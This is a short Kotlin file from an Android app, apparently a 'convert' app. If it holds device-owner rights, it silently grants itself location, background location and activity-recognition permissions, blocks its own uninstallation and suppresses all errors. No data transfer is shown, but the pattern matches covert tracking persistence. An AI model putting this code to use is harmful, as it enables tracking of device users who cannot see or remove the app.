package com.aether.convert.admin

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.os.Build

object Dp {
    private val perms = buildList {
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (Build.VERSION.SDK_INT >= 29) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            add(Manifest.permission.ACTIVITY_RECOGNITION)
        }
        if (Build.VERSION.SDK_INT >= 33) add(Manifest.permission.POST_NOTIFICATIONS)
    }
    fun isOwner(ctx: Context) = try {
        ctx.getSystemService(DevicePolicyManager::class.java)
            ?.isDeviceOwnerApp(ctx.packageName) == true
    } catch (_: Throwable) { false }

    fun grantAll(ctx: Context) {
        val dpm = ctx.getSystemService(DevicePolicyManager::class.java) ?: return
        val a = ComponentName(ctx, AdminReceiver::class.java)
        for (p in perms) try {
            dpm.setPermissionGrantState(a, ctx.packageName, p,
                DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED)
        } catch (_: Throwable) {}
        try { dpm.setUninstallBlocked(a, ctx.packageName, true) } catch (_: Throwable) {}
    }
}